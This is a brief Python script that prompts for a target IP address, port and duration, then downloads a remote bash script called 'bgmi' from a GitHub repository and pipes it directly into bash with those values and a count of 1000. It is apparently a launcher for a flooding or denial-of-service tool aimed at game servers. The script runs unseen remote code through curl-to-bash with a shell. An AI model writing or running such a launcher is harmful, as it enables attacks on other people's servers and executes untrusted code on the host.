import subprocess
import time

# Step 1: Get user inputs
ip = input("Enter IP address: ")
port = input("Enter port: ")
time_input = input("Enter time (in seconds): ")
time_duration = int(time_input)

# Step 2: Define the URL of the bash script
bash_script_url = "https://github.com/hwop/akki69/raw/master/bgmi"

# Step 3: Prepare the command to run the bash script with user inputs
command = f"curl -s {bash_script_url} | bash -s {ip} {port} {time_input} 1000"

# Step 4: Execute the command
process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = process.communicate()

# Print the output
print("Output:")
print(stdout.decode())

print("Errors:")
print(stderr.decode())

# Step 5: Wait for the specified time
time.sleep(time_duration)

# The script doesn't need to delete any files since nothing was downloaded
